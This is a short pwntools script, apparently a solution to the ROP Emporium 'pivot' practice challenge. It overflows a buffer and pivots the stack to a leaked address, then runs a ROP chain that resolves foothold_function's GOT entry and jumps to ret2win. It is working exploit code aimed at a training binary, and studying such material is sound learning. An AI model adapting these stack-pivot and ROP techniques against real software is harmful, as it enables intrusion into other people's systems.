from pwn import *

context.binary = "./pivot"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./pivot")

puts = elf.plt["puts"]


foothold_func_got_plt = 0x601040
offset = 0x117

foothold_func_plt = elf.plt["foothold_function"]  #  foothold_func
useless_func = elf.symbols["uselessFunction"]  # calls

ret_gadget = 0x4006B6  # ret

pop_rdi_gadget = 0x0400A33  # pop rdi ; ret
pop_rax_gadget = 0x04009BB  # pop rax ; ret
pop_rbp_gadget = 0x04007C8  # pop rbp ; ret


call_rax_gadget = 0x4006B0  # call rax
xchg_rax_rsp = 0x00000000004009BD  # xchg rax, rsp; ret
add_rax_rbp_gadget = 0x04009C4  # add rax, rbp ; ret
mov_rax_gadget = 0x04009C0  # mov rax, qword ptr [rax] ; ret

p = process("./pivot")

p.recvuntil(b"pivot: ")
leak = p.recvline().strip()
pivot_addr = int(leak, 16)

# find something that calls foothold function in order to get that address linked into the .got.plt
payload = p64(foothold_func_plt)

payload += p64(pop_rax_gadget)
payload += p64(foothold_func_got_plt)  # rax

payload += p64(mov_rax_gadget)  # move value at address [rax] into rax

payload += p64(pop_rbp_gadget)
payload += p64(offset)  # rbp

payload += p64(add_rax_rbp_gadget)  # rax = addr of ret2win

payload += p64(call_rax_gadget)  # call ret2win

p.sendlineafter(b"> ", payload)

smash = b"A" * 40

smash += p64(pop_rax_gadget)
smash += p64(pivot_addr)  # rax

smash += p64(xchg_rax_rsp)  # rsp = pivot_addr

p.sendlineafter(b"> ", smash)
p.interactive()
